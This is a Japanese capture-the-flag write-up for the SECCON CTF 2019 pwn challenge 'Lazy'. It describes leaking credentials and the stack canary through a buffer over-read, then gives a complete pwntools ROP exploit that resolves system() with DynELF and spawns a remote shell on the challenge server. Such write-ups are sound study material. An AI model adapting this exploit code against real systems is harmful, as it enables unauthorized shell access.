# [pwn 332pts] Lazy - SECCON CTF 2019
バイナリは配布されません。接続するとログインできるのですが、バッファオーバーリードにより正しいユーザー名とパスワードが分かります。それでログインするとバイナリがダウンロードできます。
このバイナリは64ビットバイナリで、PIE以外は有効です。
```
$ checksec -f lazy
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   109 Symbols     Yes     0               10      lazy
```
Canary付きですがユーザー名のオーバーリードでリークできます。あとはROPして終わりそうなのですが、libcが独自ビルドのもので配布されていません。libcをダウンロードするROPを組んだのですが、サーバー側が一定以上出力すると死んでしまいます。seekしたりしましたがダメでした。
最終的にはDynELFですぐ終わりました。
```python
from pwn import *

def login_user(username):
    sock.sendlineafter("Exit\n", "2")
    sock.sendlineafter(": ", username)
    sock.recvuntil(", ")
    sock.recvline()
    output = sock.recvline()
    return output
def login_pass(password):
    sock.sendlineafter(": ", password)
    return
def leak(address):
    username = b'A' * (0x5f + 0x58)
    login_user(username)
    password  = b'3XPL01717'
    password += b'A' * (0x20 - len(password))
    password += b'_H4CK3R_'
    password += b'A' * (0x40 - len(password))
    password += b'3XPL01717'
    password += b'A' * (0x60 - len(password))
    password += b'_H4CK3R_'
    password += b'A' * (0x80 - len(password))
    password += p64(0xdeadbeef)
    password += p64(rop_popper)
    password += p64(0)
    password += p64(0)
    password += p64(1)
    password += p64(elf.got["write"])
    password += p64(0x80)
    password += p64(address)
    password += p64(1)
    password += p64(rop_csu_init)
    password += p64(0) * 7
    password += p64(elf.symbols["_start"])
    login_pass(password)
    return sock.recv(0x80)

elf = ELF("../lazy")
#sock = process("../lazy")
sock = remote("lazy.chal.seccon.jp", 33333)

rop_pop_rdi = 0x004015f3
rop_pop_rsi_r15 = 0x004015f1
rop_popper = 0x4015e6
rop_csu_init = 0x4015d0

d = DynELF(leak, elf=elf)
addr_system = d.lookup('system', 'libc')
print("system = " + hex(addr_system))

# get the shell!
username = b'A' * (0x5f + 0x58)
login_user(username)
password  = b'3XPL01717'
password += b'A' * (0x20 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x40 - len(password))
password += b'3XPL01717'
password += b'A' * (0x60 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x80 - len(password))
password += p64(0xdeadbeef)
password += p64(rop_popper)
password += p64(0)
password += p64(0)
password += p64(1)
password += p64(elf.got["read"])
password += p64(0x8)
password += p64(0x602400)
password += p64(0)
password += p64(rop_csu_init)
password += p64(0) * 7
password += p64(rop_pop_rdi + 1) # ret
password += p64(rop_pop_rdi)
password += p64(0x602400)
password += p64(addr_system)
login_pass(password)
sock.send("/bin/sh\x00")

sock.interactive()
```

# 感想
あんまり肌に合わない問題でした。
